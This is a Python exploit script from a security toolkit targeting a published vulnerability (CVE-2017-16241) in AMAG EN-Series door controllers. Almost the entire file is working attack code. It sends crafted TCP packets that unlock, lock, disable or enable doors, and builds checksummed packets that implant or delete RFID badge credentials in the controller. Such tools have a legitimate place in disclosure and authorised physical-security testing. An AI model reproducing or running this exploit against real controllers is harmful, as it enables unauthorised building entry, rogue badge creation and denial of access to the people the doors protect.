#!/usr/bin/env python
# By Mike Kelly
# exfil.co
# @lixmk
#
# This script is part of the Concierge Toolkit
# https://github.com/lixmk/Concierge
#
# Exploits CVE-2017-16241 in AMAG Technologies EN-Series of door controllers
# Allows for control of door controller functions including lock, unlock, enable, and disable
# Additionally, the implant command allows for the injection of RFID badge values into the controllers local database
#
# See README.md for specific command usage
#

import socket
import argparse
import binascii
import re
import sys
from time import sleep

# Unlock Command
def unlock(rhost, port):
    print "[*] Sending 'unlock' command to "+rhost
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setblocking(0)
    s.settimeout(5)
    s.connect((rhost, port))
    # door one
    s.send('0230315a5a24556431314139'.decode('hex'))
    sleep(.25)
    # door two (for EN-2DBC)
    s.send('0230315a5a24556431324138'.decode('hex'))
    s.close

# Relock Door
def lock(rhost, port):
    print "[*] Sending 'lock' command to "+rhost
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setblocking(0)
    s.settimeout(5)
    s.connect((rhost, port))
    # door one
    s.send('0230315a5a244c6431314232'.decode('hex'))
    sleep(.25)
    # door two (for EN-2DBC)
    s.send('0230315a5a244c6431324231'.decode('hex'))
    s.close

# Implant badge
def implant(rhost, port):
    print "[*] Sending 'implant' command to "+rhost+" with CN: "+cn+", FC: "+fc+", and Pin: "+pn
    # Crafting data packet for add command #
    # |---cmd(pre)---| |---cn---| |-fc-| p1 |-pin#-| |p2| |---date---| |-----p3-----| |------------------------------p4------------------------------| |--p5--| |cks|
    # 0230315a5a624361 101010223b 101122 30 38383436 4e4e 303932393136 3132333133354e 1011101010101010101010101010101010101010101010101010101010101010 4e4e4e4e 3742
    # Reader Port 1 (EN-1DBC(+)
    pre = "0230315a5a624361"
    # Reader port 2, un-tested (EN-2DBC)
    #pre = "0230215a5a624361"
    # calculate cn
    cn0 = cn.zfill(10)
    cn1 = re.findall('..',cn0)
    cnh = hex(int(cn1[0])+0x10)[2:]+hex(int(cn1[1])+0x10)[2:]+hex(int(cn1[2])+0x10)[2:]+hex(int(cn1[3])+0x10)[2:]+hex(int(cn1[4])+0x10)[2:]
    # calculate fc
    fc0 = fc.zfill(6)
    fc1 = re.findall('..',fc0)
    fch = hex(int(fc1[0])+0x10)[2:]+hex(int(fc1[1])+0x10)[2:]+hex(int(fc1[2])+0x10)[2:]
    pnh = (pn.encode('hex'))
    p1 = "30"
    p2 = "4e4e"
    # ASCII mmddyy -> hex: Testing shows date might not matter
    date = "303130313136"
    p3 = "3132333133354e"
    p4 = "1011101010101010101010101010101010101010101010101010101010101010"
    p5 = "4e4e4e4e"
    pkt1 = pre+cnh+fch+p1+pnh+p2+date+p3+p4+p5
    cks = str(hex((0x100 - sum(bytearray(pkt1.decode('hex'))) - 1) & 0xff)[2:]).encode('hex')
    pkt2 = pkt1+cks
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setblocking(0)
    s.settimeout(5)
    s.connect((rhost, port))
    s.send(pkt2.decode('hex'))
    s.close

# Remove badge
def remove(rhost, port):
    print "[*] Sending 'remove' command to "+rhost+": Removing CN: "+cn+" FC: "+fc
    # calculate cn
    cn0 = cn.zfill(10)
    cn1 = re.findall('..',cn0)
    cnh = hex(int(cn1[0])+0x10)[2:]+hex(int(cn1[1])+0x10)[2:]+hex(int(cn1[2])+0x10)[2:]+hex(int(cn1[3])+0x10)[2:]+hex(int(cn1[4])+0x10)[2:]
    # calculate fc
    fc0 = fc.zfill(6)
    fc1 = re.findall('..',fc0)
    fch = hex(int(fc1[0])+0x10)[2:]+hex(int(fc1[1])+0x10)[2:]+hex(int(fc1[2])+0x10)[2:]
    # build packet
    pre = "0230315a5a2a4364"
    pkt1 = pre+cnh+fch
    cks = str(hex((0x100 - sum(bytearray(pkt1.decode('hex'))) - 1) & 0xff)[2:]).encode('hex')
    pkt2 = pkt1+cks
    # sending
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setblocking(0)
    s.settimeout(5)
    s.connect((rhost, port))
    s.send(pkt2.decode('hex'))
    s.close

# Disable Reader
def disable(rhost, port):
    print "[*] Sending 'disable' command to "+rhost
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setblocking(0)
    s.settimeout(5)
    s.connect((rhost, port))
    s.send('0230315a5a24526431314143'.decode('hex'))
    s.close

# Enable Reader
def enable(rhost, port):
    print "[*] Sending 'enable' command to "+rhost
    s.setblocking(0)
    s.settimeout(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((rhost, port))
    s.send('0230315a5a24526531314142'.decode('hex'))
    s.close

if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='./endbc-exploit.py -c unlock -r 192.168.1.1')
    parser.add_argument('-c', '--cmd', required=True, help='Command to send to door controller (lock, unlock, enable, disable, implant, remove')
    parser.add_argument('-r', '--rhost', required=True, help='IP of target door controller')
    parser.add_argument('-p', '--port', default="3001", type=int, help='Target port on door controller (default: %(default)s)')
    parser.add_argument('-cn', '--cn', help='RFID Card Number. Required for "implant" and "remove" commands.')
    parser.add_argument('-fc', '--fc', help='RFID Facility Code. Required for "implant" and "remove" commands.')
    parser.add_argument('-pn', '--pn', default="1234", help='Pin number for card. Used for "implant" command. (default: 1234)')
    args = parser.parse_args()
    rhost = args.rhost
    port = args.port
    cn = args.cn
    fc = args.fc
    pn = args.pn
    print "#############################################"
    print "#             Concierge Toolkit             #"
    print "#                                           #"
    print "#  AMAG EN- Series CVE-2017-16241 Exploit   #"
    print "#############################################"
    print ""
    print "[*] Targeting EN-xDBC at: "+rhost+":"+str(port)
    try:
        if args.cmd == "lock":
            lock(rhost,port)
        if args.cmd == "unlock":
            unlock(rhost,port)
        if args.cmd == "implant":
            implant(rhost,port)
        if args.cmd == "remove":
            remove(rhost,port)
        if args.cmd == "disable":
            disable(rhost,port)
        if args.cmd == "enable":
            enable(rhost,port)
    except (KeyboardInterrupt, SystemExit)as e:
        print ""
        print "[!]Keyboard Interrupt: Stopping all processes"
        sys.exit()
    except (socket.timeout, socket.error):
        print ""
        print "[!] Timed out or connection denied"
        sys.exit()
